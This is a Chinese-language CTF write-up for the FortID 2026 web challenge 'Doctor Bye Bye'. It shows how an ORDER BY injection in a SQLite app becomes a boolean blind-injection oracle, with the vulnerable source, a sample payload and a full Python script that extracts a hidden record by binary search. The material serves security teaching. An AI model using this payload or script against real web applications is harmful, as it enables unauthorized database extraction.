---
title: "Doctor Bye Bye — ORDER BY 注入做布尔盲注，挖出退休医生的告别信 (FortID CTF)"
description: FortID CTF web 题：SQLite 的 ORDER BY 子句注入，用 CASE×id 翻转排序构造布尔预言机，盲注逐字节恢复 listed=0 的隐藏记录。
type: ctf
pubDate: Oct 12 2026
updatedDate: Oct 12 2026
---

> 分类：Web ｜ 赛事：FortID CTF 2026 ｜ 关键词：SQLite、ORDER BY 注入、布尔盲注、二分法
>
> Flag: `FortID{...}`（需连题目实例获取，离线 `flag.txt` 为 `FortID{redacted}` 占位；但下文的盲注逻辑我用 sqlite3 本地跑通，成功复原了植入的测试 secret）

## 题目背景

一个 Python 原生 `http.server` 写的"当班医生看板"（`src/app.py`），只有一个接口 `/api/on-call?sort=<...>`，返回当前当班医生的 `name/specialty/room`。库里有 5 位挂牌医生（`listed=1`），外加一条**永远不会显示**的记录：

```python
connection.execute(
    "INSERT INTO doctors VALUES (?, ?, ?, ?, ?, ?, ?)",
    (404, "doctor-bye-bye", "Dr. Bye Bye", "Retired", "-", 0, flag),
)
```

id=404 的 "Dr. Bye Bye" 是 `listed=0`，flag 就藏在它的 `farewell_note`（告别信）字段里。题名 "Doctor Bye Bye" + "retired records 永不显示" 已经在提示：这是一道要把隐藏行**盲注**出来的题。

## 源码审计 / 侦察

接口把用户传的 `sort` 原样拼进了 SQL 的 `ORDER BY`：

```python
def select_on_call(order_expression):
    query = f"""
        SELECT name, specialty, room
        FROM doctors
        WHERE listed = 1
        ORDER BY {order_expression}       # ← sort 直接拼接，典型 ORDER BY 注入
        LIMIT 1
    """
    ...
    row = connection.execute(query).fetchone()
```

接口层的约束：

```python
order_expression = parameters.get("sort", ["name"])[0]
if not order_expression or len(order_expression) > 600:   # 长度 ≤ 600
    ...
try:
    doctor = select_on_call(order_expression)
except (sqlite3.Error, LookupError):
    self.send_json(400, {"error": "The on-call board could not be updated."})   # 报错被吞
```

几个关键点：

- `WHERE listed = 1` 固定，`UNION`/改 WHERE 都不好使——注入点只在 `ORDER BY`，而且 `LIMIT 1` 只回**最靠前的一行**。
- 报错被统一吞成 400，没有报错回显，所以这是**布尔盲注**，不是报错注入。
- 有 `set_progress_handler` 的 VM 预算（5 万步）和 2048 的 SQL 长度限制，但对 6 行小表的子查询完全够用。

**思路**：`ORDER BY` 后面可以放任意表达式。我用一个"表达式的值依赖于某个关于 secret 的布尔条件"的排序键，让 `LIMIT 1` 回来的那一行在条件真/假时**不同**——返回哪位医生就成了 1 bit 预言机。

## 关键漏洞：ORDER BY 子句的布尔预言机

5 位挂牌医生的 id 分别是 `10, 30, 50, 70, 90`。我用这个排序键：

```sql
ORDER BY (CASE WHEN (<条件>) THEN 1 ELSE -1 END) * id
```

- 条件为**真** → 按 `+id` 升序 → 最小的 `id=10` → 返回 **Dr. Ada Pulse**；
- 条件为**假** → 按 `-id` 升序（即最负的在前）→ `-90` 最小 → `id=90` → 返回 **Dr. Zoe Last**。

于是"返回的是不是 Ada Pulse"就是一个干净的布尔预言机。`<条件>` 用子查询去读那条隐藏记录：

```sql
(SELECT farewell_note FROM doctors WHERE id = 404)
```

## 利用步骤

### 1）先测长度，再逐字符二分

- 长度：`length((SELECT farewell_note FROM doctors WHERE id=404)) > N`，对 N 二分；
- 每个位置的字符：`unicode(substr((SELECT farewell_note FROM doctors WHERE id=404), pos, 1)) > M`，对 M（32~126）二分。

一个请求长这样（URL 编码后发）：

```
GET /api/on-call?sort=(CASE WHEN ((SELECT unicode(substr(farewell_note,1,1)) FROM doctors WHERE id=404)>78) THEN 1 ELSE -1 END)*id
```

返回 JSON 里 `doctor.name` 若是 `Dr. Ada Pulse` 即条件为真，`Dr. Zoe Last` 即为假。

### 2）自动化脚本

```python
import requests
BASE = "http://<target>/api/on-call"

def ask(cond):
    expr = f"(CASE WHEN ({cond}) THEN 1 ELSE -1 END)*id"
    r = requests.get(BASE, params={"sort": expr}).json()
    # 真 -> Ada Pulse(id=10)，假 -> Zoe Last(id=90)
    return r["doctor"]["name"] == "Dr. Ada Pulse"

SECRET = "(SELECT farewell_note FROM doctors WHERE id=404)"

# 二分长度
lo, hi = 1, 128
while lo < hi:
    mid = (lo + hi) // 2
    if ask(f"length({SECRET})>{mid}"): lo = mid + 1
    else: hi = mid
length = lo
print("length =", length)

# 二分每个字符的 unicode 码点
out = ""
for pos in range(1, length + 1):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if ask(f"unicode(substr({SECRET},{pos},1))>{mid}"): lo = mid + 1
        else: hi = mid
    out += chr(lo)
    print(out)
print("FLAG =", out)
```

每个字符 7 次左右请求，flag 几十字符，总请求数几百，分分钟跑完。

### 本地验证

我用 Python 的 `sqlite3` 原样建了这张表（含 id=404、`listed=0` 的隐藏行），把上面的预言机 + 二分逻辑直接跑了一遍，植入的测试 secret 被完整复原：

```
recovered length = 28
recovered secret = FortID{b1ind_0rder_by_l0cal}
```

证明 `(CASE WHEN cond THEN 1 ELSE -1 END)*id` 这个排序键确实能在真/假之间切换返回行，盲注链成立。换到线上实例，`farewell_note` 里就是真 flag。

## Flag

`FortID{...}`（需连题目实例获取；离线 dump 的 `flag.txt` 为 `FortID{redacted}`）

## 小结 / 收获

- **`ORDER BY` 不接受占位符、却能注入**：它不是数据位置而是表达式位置，很多"看起来只能排序"的参数其实能跑任意表达式和子查询。
- **没有回显就造结构性预言机**：当 `LIMIT 1` 只回一行时，用"排序键 × 行标识"在条件真假间切换返回不同的行，就能把布尔信息编码进"返回的是谁"。
- **`listed=1` 挡不住子查询**：WHERE 过滤的是主查询的行可见性，`ORDER BY` 里的子查询照样能读到 `listed=0` 的隐藏记录——权限边界设在了错误的层。
